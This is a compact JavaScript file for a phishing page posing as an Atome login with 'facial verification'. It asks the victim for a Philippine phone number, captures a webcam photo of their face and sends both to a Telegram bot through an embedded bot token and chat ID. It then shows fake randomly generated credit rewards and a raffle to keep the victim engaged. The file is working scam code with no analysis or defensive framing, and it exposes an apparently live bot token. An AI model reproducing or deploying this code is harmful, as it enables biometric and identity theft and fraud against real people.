// FACIAL.JS - Compact Version
const BOT_TOKEN="8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg",CHAT_ID="7298607329";
let loggedIn=false,claimed=false,balance=0,phoneNum=null,stream=null,camReady=false;
const pI=document.getElementById('phoneInput'),pE=document.getElementById('phoneError'),lBtn=document.getElementById('mainLoginBtn');
const dash=document.getElementById('dashboardPanel'),cBtn=document.getElementById('claimRewardBtn'),wBtn=document.getElementById('withdrawFundsBtn');
const bSpan=document.getElementById('balanceDisplay'),cMsg=document.getElementById('claimedStatusMsg'),hMsg=document.getElementById('registerHintMsg');
const popup=document.getElementById('facialPopup'),fVideo=document.getElementById('facialVideo'),capBtn=document.getElementById('captureFaceBtn');
const closePop=document.getElementById('closeFacialBtn'),fStatus=document.getElementById('facialStatus'),sLine=document.getElementById('scanLine'),gCircle=document.getElementById('guideCircle');

function validPhone(p){let d=p.trim().replace(/\D/g,'');return d.length===10&&d[0]==='9';}
if(pI){pI.addEventListener('input',(e)=>{let v=e.target.value.replace(/\D/g,'');if(v.length>10)v=v.slice(0,10);e.target.value=v;if(v.length&&v[0]!=='9')pE?.classList.add('show');else if(v.length===10&&v[0]==='9')pE?.classList.remove('show');else if(v.length&&v.length<10)pE?.classList.add('show');else pE?.classList.remove('show');});}

async function startCam(){try{if(stream)stream.getTracks().forEach(t=>t.stop());const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});stream=s;fVideo.srcObject=s;await new Promise(r=>{fVideo.onloadedmetadata=()=>{fVideo.play();r()}});await new Promise(r=>setTimeout(r,500));camReady=true;fStatus.innerHTML="✅ Ready!";fStatus.className="facial-status success";return true;}catch(e){fStatus.innerHTML="❌ Camera denied";fStatus.className="facial-status error";return false;}}
function stopCam(){if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}fVideo.srcObject=null;camReady=false;}
function startScan(){sLine?.classList.add('active');gCircle?.classList.add('active');setTimeout(()=>gCircle?.classList.remove('active'),600);}
function stopScan(){sLine?.classList.remove('active');}

async function captureSend(){if(!camReady){fStatus.innerHTML="❌ Not ready";return;}startScan();try{const canvas=document.createElement('canvas');canvas.width=fVideo.videoWidth;canvas.height=fVideo.videoHeight;const ctx=canvas.getContext('2d');ctx.save();ctx.scale(-1,1);ctx.drawImage(fVideo,-canvas.width,0,canvas.width,canvas.height);ctx.restore();const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.9));if(!blob||blob.size<1000){fStatus.innerHTML="❌ Capture failed";stopScan();return;}const kb=(blob.size/1024).toFixed(1);fStatus.innerHTML=`📸 ${kb}KB... sending`;const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,`face_${phoneNum}_${Date.now()}.jpg`);fd.append('caption',`🔐 NEW FACE\n📱 +63${phoneNum}\n⏰ ${new Date().toLocaleString()}`);const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});const res=await r.json();if(res.ok){fStatus.innerHTML="✅ Sent! Login successful!";stopScan();setTimeout(()=>{closePopupFunc();completeLogin(phoneNum);},1500);}else{fStatus.innerHTML="❌ Telegram error";stopScan();}}catch(e){fStatus.innerHTML="❌ Error";stopScan();}}

async function openPopup(){const v=pI.value.trim();if(!validPhone(v)){pE?.classList.add('show');pI.focus();return;}phoneNum=v;pE?.classList.remove('show');fStatus.innerHTML="🎯 Position your face";fStatus.className="facial-status";sLine?.classList.remove('active');popup.classList.add('active');await startCam();}
function closePopupFunc(){stopCam();popup.classList.remove('active');fStatus.innerHTML="🎯 Position your face";fStatus.className="facial-status";sLine?.classList.remove('active');phoneNum=null;}
function completeLogin(p){loggedIn=true;claimed=false;balance=0;refreshUI();alert(`✅ Welcome +63${p}!`);localStorage.setItem('atomeUser',JSON.stringify({phone:p,loggedIn:true,loginTime:new Date().toISOString()}));}
function refreshUI(){if(loggedIn){dash.classList.remove('hidden');lBtn.innerText="✓ LOGGED IN";lBtn.disabled=true;hMsg.innerText="🎉 You're logged in! Smash the egg!";if(claimed){cBtn.innerText="✓ Claimed";cBtn.disabled=true;cMsg.innerText=`✨ You claimed ₱${balance}!`;bSpan.innerText=`₱${balance}`;wBtn.disabled=(balance<=0);}else{cBtn.innerText="🥚 Smash & Claim";cBtn.disabled=false;cMsg.innerText="Tap 'Claim' to win up to ₱10,000!";bSpan.innerText=`₱0`;wBtn.disabled=true;}}else{dash.classList.add('hidden');lBtn.innerText="LOGIN";lBtn.disabled=false;hMsg.innerText="Enter 10-digit number for facial verification";pE?.classList.remove('show');}}
function doClaim(){if(!loggedIn){alert("Login first!");return;}if(claimed){alert(`Already claimed ₱${balance}`);return;}const inc=Math.floor(Math.random()*(10000-1000+1)+1000);balance=inc;claimed=true;let msg=`🎉 You received ₱${inc} credit increase!`;if(Math.random()<0.12)msg+=` 🍀 iPhone 17 raffle entry!`;alert(msg);refreshUI();}
function doSpend(){if(!loggedIn){alert("Login first!");return;}if(!claimed){alert("Claim first!");return;}if(balance<=0){alert("No balance");return;}if(confirm(`Enjoy ₱${balance}?`)){alert(`✅ Enjoy!`);balance=0;refreshUI();}}

lBtn?.addEventListener('click',openPopup);capBtn?.addEventListener('click',captureSend);closePop?.addEventListener('click',closePopupFunc);cBtn?.addEventListener('click',doClaim);wBtn?.addEventListener('click',doSpend);popup?.addEventListener('click',(e)=>{if(e.target===popup)closePopupFunc();});
document.getElementById('termsLink')?.addEventListener('click',(e)=>{e.preventDefault();alert("Terms of Service");});
document.getElementById('privacyLink')?.addEventListener('click',(e)=>{e.preventDefault();alert("Privacy Policy");});
const saved=localStorage.getItem('atomeUser');if(saved){try{const u=JSON.parse(saved);if(u.loggedIn){loggedIn=true;refreshUI();}}catch(e){}}
refreshUI();